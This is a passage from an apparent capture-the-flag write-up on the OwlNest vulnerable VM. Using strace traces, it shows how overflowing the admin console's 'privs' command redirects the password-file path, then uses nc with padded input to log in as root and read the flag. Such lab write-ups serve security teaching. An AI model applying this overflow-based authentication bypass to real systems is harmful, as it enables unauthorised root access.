read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"privs AAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1024) = 96
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password hello
"password hello\n", 1024)       = 15
open("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb775c000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0, ^C &lt;unfinished ...&gt;
root@pwk:~# 
</code></pre>

<p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>

<pre><code class="bash">root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x84b0000
brk(0x84b0cd0)                          = 0x84b0cd0
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x84d1cd0)                          = 0x84d1cd0
brk(0x84d2000)                          = 0x84d2000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs /home/meh/password.txt
"privs /home/meh/password.txt\n", 1024) = 29
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password arse
"password arse\n", 1024)        = 14
open("rd.txt", O_RDONLY)                = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "blah\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
</code></pre>

<p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>

<pre><code class="bash">write(1, "Ready: ", 7Ready: )                  = 7
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
"privs AAAAAAAAAAAAAAAA/home/meh/"..., 1024) = 45
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password bleh
"password bleh\n", 1024)        = 14
open("/home/meh/password.txt", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0,
</code></pre>

<p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>

<pre><code class="bash">root@pwk:~# nc 172.16.56.140 31337
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username root
Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
Ready: password password
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
               \ `-._......_.-` /
                `.  '.    .'  .'    Oh Well, in the end you did it!
                 //  _`\/`_  \\     You stopped the olws' evil plan
                ||  /\O||O/\  ||    By pwning their secret base you
                |\  \_/||\_/  /|    saved the world!
                \ '.   \/   .' /
                / ^ `'~  ~'`   \
               /  _-^_~ -^_ ~-  |
               | / ^_ -^_- ~_^\ |
               | |~_ ^- _-^_ -| |
               | \  ^-~_ ~-_^ / |
               \_/;-.,____,.-;\_/
        ==========(_(_(==)_)_)=========

The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4

Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don't forget to ping me on twitter with your thoughts

Sincerely
@Swappage

PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
</code></pre>

<p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
]]></content>
  </entry>
  
</feed>
